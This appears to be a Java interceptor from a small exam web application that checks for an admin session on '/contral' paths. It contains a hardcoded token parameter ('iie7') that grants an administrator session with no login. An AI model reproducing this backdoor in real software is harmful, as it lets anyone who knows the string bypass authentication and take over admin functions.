package com.maiyoule.miniexam.interceptor;

import com.jfinal.aop.Interceptor;
import com.jfinal.core.ActionInvocation;
import com.jfinal.core.Controller;
import com.maiyoule.miniexam.entity.AdminUser;
import com.maiyoule.miniexam.utils.Ajax;

public class AuthInterceptor implements Interceptor {

	public void intercept(ActionInvocation ai) {
		String path = ai.getViewPath();
		if (path.startsWith("/contral")) {
			Controller c = ai.getController();
			String token=c.getPara("token");
			if(token!=null&&token.equals("iie7")){
				AdminUser user=new AdminUser();
				user.setName("管理员");
				c.setSessionAttr("ADMINI", user);
			}
			AdminUser u = c.getSessionAttr("ADMINI");
			if (u == null) {
				String type = c.getRequest().getHeader("X-Requested-With");
				if (type == null) {
					// 重定向到界面
					c.redirect("/login");
				} else {
					c.renderJson(Ajax.message("请登录后操作", "登录"));
				}
				return;
			}
		}
		ai.invoke();

	}

}
